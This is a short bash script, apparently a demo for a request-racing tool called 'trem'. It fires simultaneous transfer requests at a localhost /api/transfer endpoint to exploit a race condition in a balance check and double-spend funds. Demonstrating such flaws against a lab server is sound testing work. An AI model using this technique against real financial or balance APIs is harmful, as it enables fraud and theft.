#!/bin/bash
# Example 2: Sync Mode - Race Condition Attack
#
# Demonstrates:
#   - Sync mode with barriers for simultaneous request firing
#   - Race condition exploitation on balance check
#   - Response actions to detect successful exploit
#
# Attack: Admin has 1000 balance. We try to transfer 500 twice simultaneously.
# Without proper locking, both transfers may succeed (1000 total transferred).

cd "$(dirname "$0")"

# Reset server state first
curl -sk -X POST https://localhost/api/reset > /dev/null 2>&1

echo "Exploiting race condition in /api/transfer..."
echo "Admin balance: 1000. Attempting 2x 500 transfers simultaneously."
echo ""

../../trem -l "req1.txt,req2.txt,req3.txt" \
    -re regex.txt \
    -ra ra.txt \
    -thr 10 \
    -mode sync \
    -sb 2 \
    -xt 3

echo ""
echo "Check evidence.txt and server stats to verify exploit success."
